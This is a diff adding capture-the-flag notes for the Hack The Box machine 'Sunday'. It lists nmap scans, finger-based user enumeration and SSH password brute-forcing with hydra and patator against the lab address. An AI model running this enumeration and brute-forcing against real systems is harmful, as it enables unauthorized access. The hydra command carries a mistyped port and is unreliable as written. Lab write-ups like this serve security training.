@@ -283,11 +283,43 @@ vncviewer 127.0.0.1::6901
 ```
 
 
-## 7.sunday
+## 7.Sunday
 
 ### Approach Taken
 
+- run nmap scans
+- after finding out finger is installed, use msfconsole or finger-enum to enumerate the users
+- after running the perl you must be able guess the right users
 
 ### Lessons Learnt
 
+- finger tells you what users are logged into the system, you can do some cool enumeration on the system
+- two programs to enumerate metasploit, one is metasploit `msfdb run` and two is `finger enum github`
+
 ### Commands Used
+
+```
+nmap -sC -sV -oA nmap/initial 10.10.10.76
+
+# speed up the scan considerbly
+nmap -p- -oA nmap/allports 10.10.10.76 --max-retries 1
+
+# you can type vvv to increase the verbosity
+nmap -sC -sV -p 79,111,22022,35342,56272 -oA nmap/TargetedPorts 10.10.10.76
+
+# finger-user-enum
+./finger-user-enum.pl -U /usr/share/SecLists/Usernames/Names/names.txt -h 10.10.10.76 | less -S
+./finger-user-enum.pl -u root -h 10.10.10.76
+
+ssh -p 22022 -okexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76
+
+# may not work with old boxes even though the password is correct, its because of the key exchange algorithms
+hydra -l sunny -p sunday ssh://10.10.10.76:220222
+
+# you can try another tool called patator
+patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=/usr/share/SecLists/Passwords/Probable-v2-top2575.txt persistent=0 -x ignore:mesg='Authentication failed'
+
+# go to /usr/share/SecLists/Passwords & pick a file whose wc is 1000 lines or fewer
+find . -type f -exec wc -l {} \; | sort -nr 
+
+```
